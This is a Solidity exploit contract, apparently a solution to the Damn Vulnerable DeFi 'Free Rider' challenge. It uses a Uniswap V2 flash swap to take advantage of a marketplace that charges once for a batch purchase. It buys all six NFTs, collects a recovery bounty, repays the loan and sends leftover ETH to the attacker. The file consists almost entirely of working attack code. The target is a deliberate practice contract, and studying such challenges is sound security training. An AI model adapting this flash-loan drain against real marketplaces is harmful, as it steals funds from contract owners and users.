// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "../DamnValuableNFT.sol";
import "./FreeRiderNFTMarketplace.sol";
import "./IWETH.sol";
import "./IUniswapV2Pair.sol";
import "./IUniswapV2Callee.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "hardhat/console.sol";

/**
 * @title StealFromFreeRider
 * @author Louis Law
 */
contract StealFromFreeRider is IUniswapV2Callee, IERC721Receiver {
    DamnValuableNFT immutable nft;
    FreeRiderNFTMarketplace immutable marketplace;
    address immutable recovery;
    IWETH immutable WETH;
    IUniswapV2Pair immutable pair;
    uint256 nftPrice;

    constructor(
        DamnValuableNFT _nft,
        FreeRiderNFTMarketplace _marketplace,
        address _recovery,
        IWETH _weth,
        IUniswapV2Pair _pair,
        uint256 _nftPrice
    ) payable {
        nft = _nft;
        marketplace = _marketplace;
        recovery = _recovery;
        WETH = _weth;
        pair = _pair;
        nftPrice = _nftPrice;
    }

    function start() external {
        // Trigger flash swap
        // Junk byte argument tells Uniswap this is a flash swap
        pair.swap(nftPrice, 0, address(this), hex"01");
    }

    function attack() internal {
        DamnValuableNFT _nft = nft;
        FreeRiderNFTMarketplace _marketplace = marketplace;

        uint256[] memory tokenIds = new uint256[](6);
        tokenIds[0] = 0;
        tokenIds[1] = 1;
        tokenIds[2] = 2;
        tokenIds[3] = 3;
        tokenIds[4] = 4;
        tokenIds[5] = 5;
        _marketplace.buyMany{value: nftPrice}(tokenIds);
        _nft.setApprovalForAll(address(_marketplace), true);

        for (uint8 i = 0; i < 6; ++i) {
            _nft.safeTransferFrom(
                address(this),
                recovery,
                i,
                abi.encode(tx.origin) // FreeRiderRecovery pay bouns to this encoded address
            );
        }
    }

    // flash swap callback
    function uniswapV2Call(
        address,
        uint amount0,
        uint amount1,
        bytes calldata
    ) external {
        address[] memory path = new address[](2);
        uint amountToken;
        uint amountETH;
        {
            // scope for token{0,1}, avoids stack too deep errors
            address token0 = IUniswapV2Pair(msg.sender).token0();
            address token1 = IUniswapV2Pair(msg.sender).token1();
            assert(amount0 == 0 || amount1 == 0); // this strategy is unidirectional
            path[0] = amount0 == 0 ? token0 : token1;
            path[1] = amount0 == 0 ? token1 : token0;
            amountToken = token0 == address(WETH) ? amount1 : amount0;
            amountETH = token0 == address(WETH) ? amount0 : amount1;
        }

        assert(path[0] == address(WETH) || path[1] == address(WETH)); // this strategy only works with a V2 WETH pair
        // IERC20 token = IERC20(path[0] == address(WETH) ? path[1] : path[0]);

        // get enough ETH
        WETH.withdraw(amountETH);

        // attack
        attack();

        // payback fee and amount
        uint256 amountToPay = amountETH + ((amountETH * 3) / 997) + 1;
        WETH.deposit{value: amountToPay}();
        WETH.transfer(msg.sender, amountToPay);

        // pay any remaining ETH to attacker
        payable(tx.origin).call{value: address(this).balance}("");
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
